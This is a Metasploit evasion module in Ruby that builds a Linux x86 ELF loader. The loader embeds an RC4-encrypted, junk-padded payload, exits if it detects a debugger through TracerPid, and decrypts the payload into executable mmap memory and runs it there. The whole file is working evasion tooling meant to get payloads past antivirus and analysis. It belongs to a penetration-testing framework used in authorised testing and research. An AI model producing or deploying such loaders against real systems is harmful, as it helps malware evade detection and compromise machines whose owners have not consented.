##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/compiler/linux'

class MetasploitModule < Msf::Evasion

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Linux x86 C Encrypted Payload Generator',
        'Description' => %q{
          Generates a native Linux x86 (32-bit) ELF binary that embeds an RC4-encrypted
          payload compiled from C source using GCC.

          The binary allocates executable memory with mmap, decrypts the payload
          at runtime and executes it directly in memory. An anti-tracing check
          inspects /proc/self/status to detect ptrace attachment before execution.

          Requires GCC with multilib support on the system running Metasploit
          (e.g. apt install gcc-multilib).
        },
        'Author'      => ['Nipun Weerasinghe'],
        'License'     => MSF_LICENSE,
        'Platform'    => 'linux',
        'Arch'        => [ARCH_X86],
        'Targets'     => [['Linux x86', {}]],
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('FILENAME', [true, 'Output filename', 'payload.elf'])
    ])
  end

  def rc4_key
    @rc4_key ||= Rex::Text.rand_text_alpha(32..64)
  end

  def get_payload
    @get_payload ||= begin
      junk = Rex::Text.rand_text(10..1024)
      buf  = payload.encoded + junk
      {
        size:     buf.length,
        c_format: Msf::Simple::Buffer.transform(buf, 'c', 'buf', { format: 'rc4', key: rc4_key })
      }
    end
  end

  def c_template
    @c_template ||= <<~CTEMPLATE
      #include <sys/mman.h>
      #include <string.h>
      #include <stdlib.h>
      #include <unistd.h>
      #include <fcntl.h>
      #include "rc4.h"

      // RC4-encrypted payload
      #{get_payload[:c_format]}

      static const char rc4_key[] = "#{rc4_key}";
      static const int  payload_len = #{get_payload[:size]};

      static int is_traced(void) {
        char buf2[512];
        int fd = open("/proc/self/status", O_RDONLY);
        if (fd < 0) return 0;
        ssize_t n = read(fd, buf2, sizeof(buf2) - 1);
        close(fd);
        if (n <= 0) return 0;
        buf2[n] = '\\0';
        char *ptr = strstr(buf2, "TracerPid:");
        if (!ptr) return 0;
        ptr += 10;
        while (*ptr == ' ' || *ptr == '\\t') ptr++;
        return (*ptr != '0');
      }

      int main(void) {
        if (is_traced()) return 0;

        void *exec_mem = mmap(NULL, (size_t)payload_len,
                              PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (exec_mem == MAP_FAILED) return 1;

        unsigned char *dec = (unsigned char *)malloc((size_t)payload_len);
        if (!dec) return 1;

        RC4(rc4_key, (const unsigned char *)buf, dec, payload_len);
        memcpy(exec_mem, dec, (size_t)payload_len);
        free(dec);

        ((void (*)(void))exec_mem)();
        return 0;
      }
    CTEMPLATE
  end

  def run
    raw_payload = payload.encoded
    if raw_payload.blank?
      fail_with(Failure::BadConfig, 'Failed to generate payload')
    end

    unless Metasploit::Framework::Compiler::Linux.available?(:x86)
      fail_with(
        Failure::BadConfig,
        'GCC (x86 / -m32) not found. Install gcc-multilib (e.g. apt install gcc-multilib).'
      )
    end

    vprint_line c_template

    elf = Metasploit::Framework::Compiler::Linux.compile_c(c_template, :x86)
    print_status("Compiled ELF size: #{elf.length} bytes")

    File.binwrite(datastore['FILENAME'], elf)
    File.chmod(0o755, datastore['FILENAME'])
    print_good("Saved to: #{datastore['FILENAME']}")
  end
end
